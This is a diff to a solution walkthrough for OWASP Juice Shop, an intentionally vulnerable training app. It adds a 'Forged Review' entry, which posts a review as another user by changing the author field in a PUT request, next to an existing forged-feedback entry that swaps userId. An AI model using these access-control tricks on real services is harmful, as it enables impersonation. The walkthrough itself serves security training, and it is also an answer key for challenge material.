@@ -279,7 +279,7 @@ The trick is to use a payment method you _don't really have_. For example, creat
 (do not add any payment cards) and replay this exact request (just update the `Authorization` header).
 
 ## Forged Feedback (Broken Access Control) 
-_ Post some feedback in another users name._
+_Post some feedback in another users name._
 
 Log in and post a feedback. Then modify `userId` in the request body and resend it.
 ```
@@ -288,6 +288,19 @@ Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
 Content-Type: application/json
 
 {"status":"success","data":{"id":19,"UserId":2,"comment":"AAAAAAA (***in@juice-sh.op)","rating":3,"updatedAt":"2020-08-20T14:08:30.102Z","createdAt":"2020-08-20T14:08:30.102Z"}}
+```
+
+## Forged Review (Broken Access Control) 
+_ Post a product review as another user or edit any user's existing review._
+
+Log in and post a review. Then modify `author` in the request body and resend it.
+
+```
+PUT /rest/products/1/reviews
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
+Content-Type: application/json
+
+{"message":"Not Jim's review","author":"jim@juice-sh.op"}
 ```
 
 ## Login Bender (Injection)
